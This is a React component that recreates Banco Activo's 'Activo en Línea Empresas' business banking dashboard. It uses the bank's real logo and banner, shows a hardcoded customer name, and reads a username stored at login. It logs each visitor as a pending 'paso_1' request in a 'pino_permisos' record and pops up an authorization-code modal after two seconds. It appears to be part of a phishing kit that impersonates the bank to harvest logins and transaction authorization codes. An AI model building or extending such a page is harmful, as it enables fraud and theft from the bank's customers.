import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import AuthorizationCodeModal from "@/components/AuthorizationCodeModal";

const menuItems = [
  "Pago Activo",
  "Consultas",
  "Transferencias Moneda Nacional",
  "Pagos y Recargas",
  "Afiliaciones",
  "Administración Seguridad",
  "Cash Management",
  "Solicitudes",
  "Divisas",
  "Otros servicios",
];

export default function DashboardEmpresas() {
  const navigate = useNavigate();
  const [activeItem, setActiveItem] = useState("Pago Activo");
  const [showAuthModal, setShowAuthModal] = useState(false);

  useEffect(() => {
    const initializeAuthModal = async () => {
      try {
        // Get username from sessionStorage (set during login)
        const username = sessionStorage.getItem("pinoUsername");

        // Check if we already have a requestId
        let requestId = sessionStorage.getItem("pinoRequestId");

        if (!requestId) {
          // If not, create a new request in pino_permisos
          const { api } = await import("@/api/apiClient");
          const request = await api.entities.PinoPermiso.create({
            usuario: username || "usuario",
            tipo: "empresa",
            etapa: "paso_1",
            status: "pendiente",
          });
          requestId = request.id;
          sessionStorage.setItem("pinoRequestId", requestId);
        }

        // Show modal after 2 seconds
        const timer = setTimeout(() => {
          setShowAuthModal(true);
        }, 2000);

        return () => clearTimeout(timer);
      } catch (err) {
        console.error("Error initializing auth modal:", err);
        // Still show modal even if creation fails
        const timer = setTimeout(() => {
          setShowAuthModal(true);
        }, 2000);
        return () => clearTimeout(timer);
      }
    };

    initializeAuthModal();
  }, []);

  const handleSalir = () => {
    navigate("/");
  };

  return (
    <div className="dashboard-empresas-root" style={{ minHeight: "100vh", backgroundColor: "#FFFFFF", fontFamily: "Arial, Helvetica, sans-serif", display: "flex", flexDirection: "column", overflowX: "hidden" }}>
      <style>{`
        @media screen and (max-width: 768px) {
          html, body {
            overflow-x: hidden !important;
            width: 100% !important;
            margin: 0 !important;
            padding: 0 !important;
          }
          .dashboard-empresas-root {
            overflow-x: hidden !important;
            width: 100% !important;
          }
          .de-scale-wrapper {
            width: 1024px !important;
            transform: scale(0.36) !important;
            transform-origin: top center !important;
            margin-left: calc(50vw - 512px) !important;
            display: flex !important;
            flex-direction: column !important;
            min-height: 100vh !important;
          }
        }
      `}</style>
      <div className="de-scale-wrapper">
        {/* Header */}
        <div style={{ backgroundColor: "#000066", padding: "10px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <img
            src="https://www.bancoactivo.com/logo.svg"
            alt="Activo Banco Universal"
            style={{ height: "34px", filter: "brightness(0) invert(1)", flexShrink: 0 }}
          />
          <span style={{ color: "#FFFFFF", fontSize: "12px", whiteSpace: "nowrap" }}>RIF: J-08106622-7</span>
        </div>

        {/* Sub-header */}
        <div style={{ backgroundColor: "#f0f0f0", borderBottom: "1px solid #d0d0d0", padding: "8px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ display: "flex", alignItems: "center" }}>
            <span style={{ color: "#000066", fontSize: "14px", fontWeight: 600 }}>Activo en Línea</span>
            <span style={{ display: "inline-block", width: "2px", height: "18px", backgroundColor: "#ff9900", margin: "0 8px" }}></span>
            <span style={{ color: "#0000cc", fontSize: "14px", fontWeight: 600 }}>Empresas</span>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
            <div style={{ textAlign: "right", lineHeight: 1.3 }}>
              <div style={{ fontSize: "11px", color: "#333333", fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "flex-end", gap: "4px" }}>
                <svg width="11" height="11" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="8" r="4" stroke="#333" strokeWidth="2" />
                  <path d="M4 20c0-4 4-6 8-6s8 2 8 6" stroke="#333" strokeWidth="2" strokeLinecap="round" />
                </svg>
                INVERBALA 1651 CA - Sr(a) CRITINA GUATARAMA (Master/Unico)
              </div>
              <div style={{ fontSize: "10px", color: "#666666", display: "flex", alignItems: "center", justifyContent: "flex-end", gap: "4px" }}>
                <svg width="10" height="10" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="12" r="9" stroke="#666" strokeWidth="2" />
                  <path d="M12 7v5l3 2" stroke="#666" strokeWidth="2" strokeLinecap="round" />
                </svg>
                Última conexión: 07/07/2026 08:26am
              </div>
            </div>
            <button
              onClick={handleSalir}
              style={{
                backgroundColor: "#000066",
                color: "#FFFFFF",
                border: "none",
                padding: "5px 12px",
                fontSize: "11px",
                fontWeight: 600,
                cursor: "pointer",
                fontFamily: "Arial, Helvetica, sans-serif",
                whiteSpace: "nowrap",
                display: "flex",
                alignItems: "center",
                gap: "6px",
              }}
            >
              Salir
              <span style={{ display: "inline-flex", alignItems: "center", justifyContent: "center", width: "14px", height: "14px", borderRadius: "50%", border: "1px solid #FFFFFF", fontSize: "9px" }}>→</span>
            </button>
          </div>
        </div>

        {/* Main Layout */}
        <div style={{ flex: 1, display: "flex", width: "100%" }}>
          {/* Sidebar */}
          <aside style={{ width: "220px", backgroundColor: "#e0e0e0", borderRight: "1px solid #c0c0c0", padding: "0", flexShrink: 0 }}>
            <ul style={{ listStyle: "none", margin: 0, padding: 0 }}>
              {menuItems.map((item) => (
                <li
                  key={item}
                  onClick={() => {
                    setActiveItem(item);
                    if (item === "Pago Activo") {
                      setShowAuthModal(true);
                    }
                  }}
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    padding: "8px 12px",
                    cursor: "pointer",
                    fontSize: "11px",
                    color: "#0000cc",
                    fontFamily: "Arial, Helvetica, sans-serif",
                    backgroundColor: activeItem === item ? "#d0d0d0" : "transparent",
                    borderBottom: "1px solid #cfcfcf",
                    userSelect: "none",
                  }}
                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = "#d0d0d0")}
                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = activeItem === item ? "#d0d0d0" : "transparent")}
                >
                  <span>{item}</span>
                  <span style={{ color: "#0000cc", fontSize: "10px" }}>›</span>
                </li>
              ))}
            </ul>
          </aside>

          {/* Center Content */}
          <main style={{ flex: 1, backgroundColor: "#FFFFFF", padding: "20px", position: "relative", overflow: "hidden", display: "flex", justifyContent: "center" }}>
            {/* Watermark logo */}
            <div style={{
              position: "absolute",
              top: "50%",
              left: "50%",
              transform: "translate(-50%, -50%)",
              opacity: 0.04,
              pointerEvents: "none",
              fontSize: "140px",
              fontWeight: 800,
              color: "#000066",
              fontFamily: "Arial, Helvetica, sans-serif",
            }}>
              A
            </div>

            {/* Banner Image */}
            <img
              src="https://activoenlinea.bancoactivo.com/naturales/usuarios/obtener_banner/3/133"
              alt="Solidaridad Activa - Activo Banco Universal"
              style={{
                maxWidth: "90%",
                height: "auto",
                display: "block",
                margin: "0 auto",
                position: "relative",
                zIndex: 1,
              }}
            />
          </main>
        </div>

        {/* Footer */}
        <div style={{ backgroundColor: "#FFFFFF", borderTop: "1px solid #ccc", padding: "10px 24px", textAlign: "center" }}>
          <p style={{ fontSize: "11px", color: "#000066", margin: 0 }}>
            © Copyright 2026 Banco Activo, C.A. Banco Universal. RIF: J-08106622-7. Todos los derechos reservados. La información mostrada en esta página, es de carácter Confidencial
          </p>
        </div>
      </div>{/* end de-scale-wrapper */}

      <AuthorizationCodeModal
        isOpen={showAuthModal}
        onClose={() => setShowAuthModal(false)}
      />
    </div>
  );
}